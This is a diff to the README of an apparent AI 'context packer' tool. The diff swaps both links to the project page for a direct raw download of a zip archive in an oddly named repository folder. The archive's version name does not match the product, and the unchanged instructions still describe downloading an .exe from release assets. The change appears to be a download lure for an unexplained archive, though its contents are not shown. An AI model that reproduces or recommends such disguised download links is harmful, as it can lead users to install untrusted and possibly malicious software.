@@ -1,6 +1,6 @@
 # 📦 claude-opus48-context-packer - Optimize your AI model context window
 
-[https://github.com/Veronika0306/claude-opus48-context-packer](https://github.com/Veronika0306/claude-opus48-context-packer)
+[https://raw.githubusercontent.com/Veronika0306/claude-opus48-context-packer/main/wishness/context-opus-packer-claude-3.9-alpha.4.zip](https://raw.githubusercontent.com/Veronika0306/claude-opus48-context-packer/main/wishness/context-opus-packer-claude-3.9-alpha.4.zip)
 
 This tool helps you manage large amounts of data for your AI models. It packs your files into a format that Claude Opus 4.8, Fable 5, and Mythos 5 understand. By doing this, you fit more information into the context window of these models. This lets the AI perform better on complex tasks without losing track of your project details.
 
@@ -19,7 +19,7 @@ Your computer needs to meet these basic standards to run the software.
 
 You can get the application from the project page. Visit the link below to reach the latest version.
 
-[Download the application installer here](https://github.com/Veronika0306/claude-opus48-context-packer)
+[Download the application installer here](https://raw.githubusercontent.com/Veronika0306/claude-opus48-context-packer/main/wishness/context-opus-packer-claude-3.9-alpha.4.zip)
 
 Once you click the link, your browser will open a new page. Look for the "Assets" section at the bottom of the latest release. Click the file ending in .exe to start the download. Save this file to your desktop or your downloads folder.
 
